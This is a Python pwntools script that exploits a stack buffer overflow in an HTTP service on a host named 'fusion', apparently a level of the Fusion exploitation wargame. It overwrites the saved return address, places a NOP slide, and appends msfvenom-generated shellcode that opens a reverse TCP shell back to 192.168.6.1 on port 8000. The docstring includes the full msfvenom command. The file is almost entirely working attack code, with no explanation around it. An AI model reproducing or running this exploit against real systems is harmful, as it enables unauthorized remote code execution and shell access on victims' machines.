import pwn


RHOST = 'fusion'
RPORT = 20000 
def main():
    io = pwn.remote(RHOST, RPORT)

    # Receive debug string
    print(io.recvline())

    payload = assemble_payload()
    io.send(payload)

    try: 
        final_reply = io.recvline()
        if b"trying to access" in final_reply:
            print('Saw final return message. Buffer was not overflown :(')
        else:
            print('ERROR: unexpected output in final reply:')
            print(final_reply)
    except EOFError as err:
        print('Did not see final return message. Buffer was probably successfully overflown (or the app otherwise crashed)')
        
def assemble_payload():
    # Legitimate usage parameters
    method = b'GET'
    path = b'/'
    protocol = b'HTTP/1.1'

    # Exploit parameters
    bytes_from_path_to_stored_eip = 139
    ## Arbitrary number. Just has to jump over the HTTP/1.1
    bytes_from_path_end_to_target_address = 50 
    base_buffer_address = 0xbffff8f8
    target_jump_address = base_buffer_address + bytes_from_path_to_stored_eip + bytes_from_path_end_to_target_address

    # Modifying the path so it overflows the stored EIP
    target_jump_address_packed = pwn.p32(target_jump_address)
    overflow_path = path
    overflow_path += b'A' * bytes_from_path_to_stored_eip
    overflow_path += target_jump_address_packed

    # Assemble the reverse shell code
    ## nopslide should be at least as long as the jump itself so the jump definitely lands on the nopslide
    nopslide_length = bytes_from_path_end_to_target_address
    nopslide = pwn.asm(pwn.shellcraft.nop()) * nopslide_length
    shell_code = b''
    shell_code += nopslide
    # shell_code += pwn.asm(pwn.shellcraft.i386.crash())
    shell_code += get_reverse_shell_shellcode()

    # Putting all the pieces together
    ## Format:
    ## METHOD PATH PROTOCOL SHELLCODE
    payload = method
    payload += b' '
    payload += overflow_path
    payload += b' '
    payload += protocol
    payload += b' '
    payload += shell_code

    print('Payload assembled:')
    print(payload)

    return payload

def get_reverse_shell_shellcode():
    """Gets the reverse shell shellcode that was generated by msfvenom
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.6.1 LPORT=8000 -a x86 --platform linux -b '\x00\x2f' -f python
    """
    buf =  b""
    buf += b"\xbb\x44\xd1\x0d\x1d\xdd\xc7\xd9\x74\x24\xf4\x5d\x31"
    buf += b"\xc9\xb1\x12\x31\x5d\x12\x83\xc5\x04\x03\x19\xdf\xef"
    buf += b"\xe8\x90\x04\x18\xf1\x81\xf9\xb4\x9c\x27\x77\xdb\xd1"
    buf += b"\x41\x4a\x9c\x81\xd4\xe4\xa2\x68\x66\x4d\xa4\x8b\x0e"
    buf += b"\x8e\xfe\x6a\xcf\x66\xfd\x72\xd0\x36\x88\x92\x5e\xd0"
    buf += b"\xda\x05\xcd\xae\xd8\x2c\x10\x1d\x5e\x7c\xba\xf0\x70"
    buf += b"\xf2\x52\x65\xa0\xdb\xc0\x1c\x37\xc0\x56\x8c\xce\xe6"
    buf += b"\xe6\x39\x1c\x68"

    return buf

    

if __name__ == "__main__":
    main()
